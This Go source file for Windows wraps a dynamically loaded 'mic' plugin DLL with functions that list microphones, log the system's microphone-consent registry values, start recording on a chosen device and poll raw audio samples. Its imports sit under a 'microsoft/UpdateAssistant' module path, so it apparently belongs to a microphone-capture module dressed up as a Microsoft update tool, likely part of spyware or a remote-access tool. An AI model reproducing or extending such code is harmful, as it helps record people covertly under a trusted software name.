//go:build windows

package sysutil

import (
	"encoding/json"
	"sync"
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/loader"
	"github.com/microsoft/UpdateAssistant/modules/logger"
)

var (
	micMu   sync.Mutex
	micPlug *loader.Plugin
)

func micDLL(fn func(*loader.Plugin)) {
	micMu.Lock()
	defer micMu.Unlock()
	if micPlug == nil {
		p, err := loader.Load("mic")
		if err != nil {
			logger.Error("[mic] dll load failed: %v", err)
			return
		}
		logger.Info("[mic] dll loaded")
		micPlug = p
	}
	fn(micPlug)
}

func MicUnload() {
	micMu.Lock()
	defer micMu.Unlock()
	if micPlug != nil {
		loader.Unload(micPlug)
		micPlug = nil
	}
}

func MicList() []struct {
	ID   int    `json:"id"`
	Name string `json:"name"`
} {
	logger.Info("[mic] MicList called")
	var out []struct {
		ID   int    `json:"id"`
		Name string `json:"name"`
	}
	micDLL(func(p *loader.Plugin) {
		buf := make([]byte, 4096)
		n, err := p.Call("mic_list", uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
		if err != nil {
			logger.Error("[mic] mic_list call error: %v", err)
			return
		}
		raw := buf[:int(n)]
		logger.Info("[mic] mic_list raw: %s", string(raw))
		var resp struct {
			Count   int `json:"count"`
			HKLM    int `json:"hklm"`
			HKCU    int `json:"hkcu"`
			Devices []struct {
				ID   int    `json:"id"`
				Name string `json:"name"`
			} `json:"devices"`
		}
		if err := json.Unmarshal(raw, &resp); err != nil {
			logger.Error("[mic] mic_list parse error: %v", err)
			return
		}
		logger.Info("[mic] waveInGetNumDevs=%d hklm_consent=%d hkcu_consent=%d devices=%d",
			resp.Count, resp.HKLM, resp.HKCU, len(resp.Devices))
		for i, d := range resp.Devices {
			logger.Info("[mic] device[%d] id=%d name=%s", i, d.ID, d.Name)
			out = append(out, struct {
				ID   int    `json:"id"`
				Name string `json:"name"`
			}{ID: d.ID, Name: d.Name})
		}
		if len(resp.Devices) == 0 {
			logger.Error("[mic] no devices — consent hklm=%d hkcu=%d waveIn=%d", resp.HKLM, resp.HKCU, resp.Count)
		}
	})
	return out
}

func MicStart(deviceID int) bool {
	logger.Info("[mic] MicStart device_id=%d", deviceID)
	var ok bool
	micDLL(func(p *loader.Plugin) {
		buf := make([]byte, 256)
		n, err := p.Call("mic_start", uintptr(deviceID), uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
		if err != nil {
			logger.Error("[mic] mic_start call error: %v", err)
			return
		}
		var res struct {
			OK     bool   `json:"ok"`
			Detail string `json:"detail"`
		}
		json.Unmarshal(buf[:int(n)], &res)
		logger.Info("[mic] mic_start ok=%v detail=%s", res.OK, res.Detail)
		ok = res.OK
	})
	return ok
}

func MicStop() {
	logger.Info("[mic] MicStop")
	micDLL(func(p *loader.Plugin) {
		buf := make([]byte, 256)
		p.Call("mic_stop", uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	})
}

func MicPoll(buf []int16) int {
	var n int
	micDLL(func(p *loader.Plugin) {
		if len(buf) == 0 {
			return
		}
		r, _ := p.Call("mic_poll", uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
		n = int(r)
	})
	return n
}
